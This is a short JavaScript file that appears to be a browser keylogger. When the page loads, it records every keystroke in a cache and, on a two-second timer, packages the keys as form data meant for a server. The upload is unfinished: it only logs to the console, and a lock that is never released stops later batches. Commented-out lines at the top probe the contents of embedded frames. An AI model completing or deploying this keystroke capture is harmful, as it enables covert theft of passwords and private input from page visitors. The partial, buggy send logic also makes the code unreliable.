/*console.log(window.frames[0]);
console.log(window.frames[0].contentWindow);
console.log(window.frames[0].document);
console.log(window.frames[0].frames.document.body.style.background);*/


var keylog = {
  // (A) SETTINGS & PROPERTIES
  cache : [],      // temp storage for key presses
  delay : 2000,    // how often to send data to server
  sending : false, // flag to allow 1 upload at a time

  // (B) INITIALIZE
  init : () => {
    // (B1) CAPTURE KEY STROKES
    window.addEventListener("keydown", evt => keylog.cache.push(evt.key));
 
    // (B2) SEND KEYSTROKES TO SERVER
    window.setInterval(keylog.send, keylog.delay);
  },

  // (C) AJAX SEND KEYSTROKES
  send : () => { if (!keylog.sending && keylog.cache.length != 0) {
    // (C1) "LOCK" UNTIL THIS BATCH IS SENT TO SERVER
    keylog.sending = true;
 
    // (C2) KEYPRESS DATA
    var data = new FormData();
    data.append("keys", JSON.stringify(keylog.cache));
    keylog.cache = []; // clear keys

    // (C3) FECTH SEND
    console.log(data);
  }}
};
window.addEventListener("DOMContentLoaded", keylog.init);
